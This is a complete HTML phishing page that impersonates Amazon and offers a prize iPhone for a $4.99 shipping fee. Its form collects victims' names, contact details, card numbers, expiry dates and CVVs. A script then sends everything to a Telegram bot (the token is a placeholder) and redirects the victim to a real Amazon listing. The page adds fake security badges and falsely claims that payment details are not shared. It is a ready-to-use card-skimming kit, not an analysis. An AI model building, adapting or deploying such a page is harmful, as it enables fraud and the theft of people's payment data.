<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment - Amazon Loyalty Program</title>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" onclick="redirectToAmazon()">
        </div>

        <div class="progress-bar">
            <div class="progress"></div>
        </div>

        <div class="summary">
            <p>You are about to pay for shipping to receive your <strong>Apple iPhone 16 Pro</strong>.</p>
            <p>Shipping Cost: <strong>$4.99</strong></p>
        </div>

        <div class="security-icons">
            <img src="file:///C:/Users/nxbus/Downloads/tool/lol/h/pngegg.png" alt="Visa Secure">
            <img src="file:///C:/Users/nxbus/Downloads/tool/lol/h/Mastercard_2019_logo.svg.png" alt="Mastercard">
            <img src="file:///C:/Users/nxbus/Downloads/tool/lol/h/ssl-secured7869.jpg" alt="SSL Secure">
        </div>

        <form id="payment-form" onsubmit="submitPayment(event)">
            <div class="form-group">
                <label for="name">Full Name</label>
                <input type="text" id="name" name="name" placeholder="Enter your full name" required>
            </div>

            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="Enter your email address" required>
            </div>

            <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
            </div>

            <div class="form-group">
                <label for="country">Country</label>
                <select id="country" name="country" required>
                    <option value="">Select your country</option>
                    <option value="US">United States</option>
                    <option value="UK">United Kingdom</option>
                    <option value="CA">Canada</option>
                    <option value="AU">Australia</option>
                    <option value="DE">Germany</option>
                </select>
            </div>

            <div class="form-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
            </div>

            <div class="form-group">
                <label for="expiry-date">Expiry Date</label>
                <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
            </div>

            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required>
            </div>

            <button type="submit" class="button">Pay $4.99</button>
        </form>

        <div class="trusted-logos">
            <img src="https://images.prismic.io/volusion/030c7cea-b6bc-49dd-982d-328c70aedb24_trustedsitelogo.png?auto=compress,format&rect=181,0,2087,888&w=825&h=351" alt="Trusted Site">
            <img src="https://static.vecteezy.com/system/resources/previews/024/044/763/non_2x/secure-ssl-encryption-logo-secure-connection-icon-illustration-ssl-certificate-icon-secure-ssl-encryption-illustration-logo-design-vector.jpg" alt="Encryption Guaranteed">
        </div>

        <div class="disclaimer">
            <p>All transactions are secured and encrypted. Your payment details will not be shared with any third parties.</p>
        </div>
    </div>

    <script>
        const botToken = "#YOURBOTOKENHERE";
        const chatId = "YOURCHADIDHERE";

        function redirectToAmazon() {
            window.location.href = "https://www.amazon.co.uk/Apple-iPhone-Pro-Max-256/dp/B0DGHZ1MC2";
        }

        function submitPayment(event) {
            event.preventDefault();

            const paymentData = {
                name: document.getElementById('name').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                country: document.getElementById('country').value,
                cardNumber: document.getElementById('card-number').value,
                expiryDate: document.getElementById('expiry-date').value,
                cvv: document.getElementById('cvv').value
            };

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `New Payment Details:\nName: ${paymentData.name}\nEmail: ${paymentData.email}\nPhone: ${paymentData.phone}\nCountry: ${paymentData.country}\nCard Number: ${paymentData.cardNumber}\nExpiry Date: ${paymentData.expiryDate}\nCVV: ${paymentData.cvv}`
                })
            }).then(response => {
                if (response.ok) {
                    window.location.href = "https://www.amazon.co.uk/Apple-iPhone-Pro-Max-256/dp/B0DGHZ1MC2";
                } else {
                    alert("Failed to send payment details to Telegram.");
                }
            });
        }
    </script>

    <style>
        body {
            font-family: 'Amazon Ember', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f7f7;
        }

        .container {
            max-width: 500px;
            margin: 50px auto;
            background-color: white;
            border: 1px solid #ddd;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        .header {
            background-color: #232f3e;
            color: white;
            text-align: center;
            padding: 15px 0;
            border-radius: 8px 8px 0 0;
        }

        .header img {
            width: 120px;
            cursor: pointer;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .button {
            background-color: #ff9900;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }

        .button:hover {
            background-color: #e68a00;
        }

        .summary {
            margin-bottom: 20px;
            font-size: 16px;
            color: #333;
        }

        .summary strong {
            display: block;
            margin-top: 10px;
        }

        .security-icons {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }

        .security-icons img {
            height: 40px;
        }

        .trusted-logos {
            text-align: center;
            margin-top: 20px;
        }

        .trusted-logos img {
            max-height: 60px;
            margin: 10px;
        }

        .disclaimer {
            font-size: 12px;
            color: #666;
            text-align: center;
            margin-top: 20px;
        }

        .progress-bar {
            width: 100%;
            background-color: #ddd;
            border-radius: 5px;
            margin: 20px 0;
        }

        .progress {
            width: 80%;
            height: 8px;
            background-color: #ff9900;
            border-radius: 5px;
        }
    </style>
</body>
</html>
